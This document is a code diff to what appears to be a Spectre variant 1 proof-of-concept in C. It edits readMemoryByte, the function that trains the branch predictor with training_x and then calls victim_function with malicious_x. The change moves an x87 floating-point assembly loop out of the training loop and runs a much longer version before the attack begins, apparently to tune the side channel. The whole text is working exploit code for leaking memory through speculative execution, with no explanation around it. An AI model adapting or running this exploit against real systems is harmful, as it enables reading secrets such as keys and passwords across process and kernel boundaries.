@@ -42,7 +42,18 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
   size_t training_x, x;
   register uint64_t time1, time2;
   volatile uint8_t * addr;
-
+  float a = 1.11, b = 4.77;
+  int p;
+  for (p = 0; p < 15000000; p++) {
+        __asm__ (
+        "fld %1;"
+        "fld %2;"
+        "faddp;"
+        "fstp %0;"
+        : "=m" (a)
+        : "m" (a), "m" (b)
+        );
+  }
   for (i = 0; i < 256; i++)
     results[i] = 0;
   for (tries = 999; tries > 0; tries--) {
@@ -62,18 +73,8 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
       x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
       x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
       x = training_x ^ (x & (malicious_x ^ training_x));
-      float a = 1.11, b = 4.77;
-      int i;
-      for (i = 0; i < 200; i++) {
-        __asm__ (
-        "fld %1;"
-        "fld %2;"
-        "fadd;"
-        "fstp %0;"
-        : "=m" (a)
-        : "m" (a), "m" (b)
-        );
-       }
+      
+      
 
       victim_function(x);
 
